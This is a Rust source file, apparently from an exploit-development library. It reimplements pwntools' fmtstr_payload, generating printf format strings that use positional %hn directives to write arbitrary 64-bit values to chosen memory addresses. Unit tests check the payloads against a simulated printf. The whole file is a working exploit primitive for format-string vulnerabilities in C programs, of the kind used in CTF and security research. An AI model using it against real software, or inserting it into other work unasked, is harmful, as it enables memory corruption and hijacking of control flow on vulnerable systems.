//! Format-string write payloads: build a printf format string that writes chosen values to chosen
//! addresses via the `%n` family (pwntools' `fmtstr_payload`). 64-bit, two-byte (`%hn`) writes.
//!
//! `offset` is the printf argument index at which the payload itself begins on the stack (the usual
//! "the Nth `%p` is my input" offset). Each requested 64-bit value is split into little-endian
//! 2-byte half-words (trailing zero half-words dropped); the half-word writes are emitted in
//! ascending value order so the running `%c` character count only grows.

/// Builds a format-string payload writing each `(addr, value)` with `%hn`.
pub fn fmtstr_payload(offset: usize, writes: &[(u64, u64)]) -> Vec<u8> {
    // Expand to half-word writes, dropping high zero half-words (keep at least one).
    let mut parts: Vec<(u64, u16)> = Vec::new();
    for &(addr, value) in writes {
        let hws = [
            value as u16,
            (value >> 16) as u16,
            (value >> 32) as u16,
            (value >> 48) as u16,
        ];
        let top = (0..4).rev().find(|&k| hws[k] != 0).unwrap_or(0);
        for (k, &hw) in hws.iter().enumerate().take(top + 1) {
            parts.push((addr + 2 * k as u64, hw));
        }
    }
    parts.sort_by_key(|&(_, v)| v);

    // Fixpoint: the number of 8-byte stack slots the directives occupy sets the argument index of
    // the first address, which in turn affects the directive text length.
    let mut slots = parts.len();
    for _ in 0..8 {
        let directives = build_directives(offset, &parts, slots);
        let padded = directives.len().div_ceil(8) * 8;
        let new_slots = padded / 8;
        if new_slots == slots {
            break;
        }
        slots = new_slots;
    }

    let mut out = build_directives(offset, &parts, slots);
    while !out.len().is_multiple_of(8) {
        out.push(b'.'); // non-null padding to an 8-byte boundary
    }
    for (addr, _) in &parts {
        out.extend_from_slice(&addr.to_le_bytes());
    }
    out
}

/// The directive portion: for each half-word write, a `%<delta>c` to advance the count to the
/// target, then a positional `%<arg>$hn` that writes the low 16 bits of the count to that address.
fn build_directives(offset: usize, parts: &[(u64, u16)], slots: usize) -> Vec<u8> {
    let mut s = Vec::new();
    let mut printed: u32 = 0;
    for (i, &(_, value)) in parts.iter().enumerate() {
        let target = u32::from(value);
        let delta = target.wrapping_sub(printed) & 0xffff;
        if delta != 0 {
            s.extend_from_slice(format!("%{delta}c").as_bytes());
            printed = printed.wrapping_add(delta);
        }
        let arg = offset + slots + i;
        s.extend_from_slice(format!("%{arg}$hn").as_bytes());
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    /// A tiny glibc-style printf that understands `%<width>c` (advances the count, consumes a
    /// sequential arg) and positional `%<n>$hn` (writes the low 16 bits of the count to the address
    /// held in arg n). `args[i]` is the 8-byte stack slot at argument index `i`. Returns the writes.
    fn simulate(fmt: &[u8], args: &HashMap<usize, u64>) -> HashMap<u64, u16> {
        let mut writes = HashMap::new();
        let mut printed: u32 = 0;
        let mut seq = 0usize; // next sequential arg
        let mut i = 0usize;
        while i < fmt.len() {
            if fmt[i] != b'%' {
                printed += 1;
                i += 1;
                continue;
            }
            i += 1; // past '%'
            // read a number
            let start = i;
            while i < fmt.len() && fmt[i].is_ascii_digit() {
                i += 1;
            }
            let num: usize = std::str::from_utf8(&fmt[start..i]).unwrap().parse().unwrap_or(0);
            if i < fmt.len() && fmt[i] == b'c' {
                printed += num as u32; // %<num>c prints num chars
                seq += 1; // consumes one sequential arg
                i += 1;
            } else if i < fmt.len() && fmt[i] == b'$' {
                // positional: %<num>$hn
                i += 1;
                assert_eq!(&fmt[i..i + 2], b"hn", "only %hn is simulated");
                i += 2;
                let addr = *args.get(&num).expect("arg present");
                writes.insert(addr, (printed & 0xffff) as u16);
            } else {
                panic!("unexpected directive");
            }
        }
        let _ = seq;
        writes
    }

    /// Lays the payload out as the stack starting at `offset` and runs the simulator.
    fn check(offset: usize, writes: &[(u64, u64)]) {
        let payload = fmtstr_payload(offset, writes);
        // Build the arg map: argument k (k >= offset) is the 8-byte slot (k-offset)*8 of the payload.
        let mut args = HashMap::new();
        for k in 0..(payload.len() / 8 + 1) {
            let off = k * 8;
            if off + 8 <= payload.len() {
                let v = u64::from_le_bytes(payload[off..off + 8].try_into().unwrap());
                args.insert(offset + k, v);
            }
        }
        let got = simulate(&payload, &args);
        // Every requested half-word must have been written correctly.
        for &(addr, value) in writes {
            let hws = [value as u16, (value >> 16) as u16, (value >> 32) as u16, (value >> 48) as u16];
            let top = (0..4).rev().find(|&k| hws[k] != 0).unwrap_or(0);
            for (k, &hw) in hws.iter().enumerate().take(top + 1) {
                let a = addr + 2 * k as u64;
                assert_eq!(got.get(&a), Some(&hw), "write to {a:#x} (value {value:#x})");
            }
        }
    }

    #[test]
    fn single_write_round_trips_through_printf() {
        check(6, &[(0x601020, 0xdead)]);
        check(6, &[(0x601020, 0xdeadbeef)]);
    }

    #[test]
    fn two_writes_round_trip() {
        check(8, &[(0x404018, 0x1234), (0x404028, 0x4567)]);
    }

    #[test]
    fn full_address_value_round_trips() {
        check(6, &[(0x404018, 0x7ffff7a52290)]);
    }
}
